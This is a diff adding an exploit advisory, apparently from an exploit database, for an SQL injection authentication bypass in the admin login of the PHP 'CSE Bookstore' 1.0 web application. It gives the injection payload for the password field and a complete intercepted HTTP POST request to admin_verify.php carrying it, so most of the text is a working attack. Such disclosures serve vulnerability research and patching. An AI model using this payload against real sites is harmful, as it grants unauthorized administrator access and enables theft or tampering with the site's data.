@@ -1,0 +1,33 @@
+# Exploit Title: CSE Bookstore Authentication Bypass
+# Date: 27/10/2020
+# Exploit Author: Alper Basaran
+# Vendor Homepage: https://projectworlds.in/
+# Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip
+# Version: 1.0
+# Tested on: Windows 10 Enterprise 1909
+
+
+CSE Bookstore is vulnerable to an authentication bypass vulnerability on the admin panel. 
+By default the admin panel is located at /admin.php and the administrator interface can be accessed by unauthorized users exploiting the SQL injection vulnerability.
+
+Payload: 
+Name: admin
+Pass: %' or '1'='1 
+
+Sample BurpSuite intercept:
+
+POST /bookstore/admin_verify.php HTTP/1.1
+Host: 192.168.20.131
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Origin: http://192.168.20.131
+Connection: close
+Referer: http://192.168.20.131/bookstore/admin.php
+Cookie: PHPSESSID=hmqnib0ihkvo235jor7mpfoupv
+Upgrade-Insecure-Requests: 1
+
+name=admin&pass=%25%27+or+%271%27%3D%271&submit=Submit+Query
